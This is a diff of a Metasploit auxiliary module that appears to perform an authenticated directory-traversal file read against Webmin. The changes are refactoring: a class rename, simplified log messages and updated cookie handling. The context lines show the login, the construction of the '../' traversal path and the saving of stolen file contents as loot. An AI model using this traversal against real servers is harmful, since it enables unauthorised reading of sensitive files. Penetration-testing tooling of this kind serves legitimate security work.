@@ -1,12 +1,12 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 
     peer = "#{rhost}:#{rport}"
 
-    print_status("#{peer} - Attempting to login...")
+    print_status("Attempting to login...")
 
     data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"
 
@@ -68,20 +68,20 @@ class Metasploit3 < Msf::Auxiliary
         'data'    => data
       }, 25)
 
-    if res and res.code == 302 and res.headers['Set-Cookie'] =~ /sid/
-      session = res.headers['Set-Cookie'].scan(/sid\=(\w+)\;*/).flatten[0] || ''
+    if res and res.code == 302 and res.get_cookies =~ /sid/
+      session = res.get_cookies.scan(/sid\=(\w+)\;*/).flatten[0] || ''
       if session and not session.empty?
-        print_good "#{peer} - Authentication successful"
+        print_good "Authentication successful"
       else
-        print_error "#{peer} - Authentication failed"
+        print_error "Authentication failed"
         return
       end
     else
-      print_error "#{peer} - Authentication failed"
+      print_error "Authentication failed"
       return
     end
 
-    print_status("#{peer} - Attempting to retrieve #{datastore['RPATH']}...")
+    print_status("Attempting to retrieve #{datastore['RPATH']}...")
 
     traversal = "../" * datastore['DEPTH']
     traversal << datastore['RPATH']
@@ -98,9 +98,9 @@ class Metasploit3 < Msf::Auxiliary
       loot = $1
       f = ::File.basename(datastore['RPATH'])
       path = store_loot('webmin.file', 'application/octet-stream', rhost, loot, f, datastore['RPATH'])
-      print_status("#{peer} - #{datastore['RPATH']} saved in #{path}")
+      print_status("#{datastore['RPATH']} saved in #{path}")
     else
-      print_error("#{peer} - Failed to retrieve the file")
+      print_error("Failed to retrieve the file")
       return
     end
 
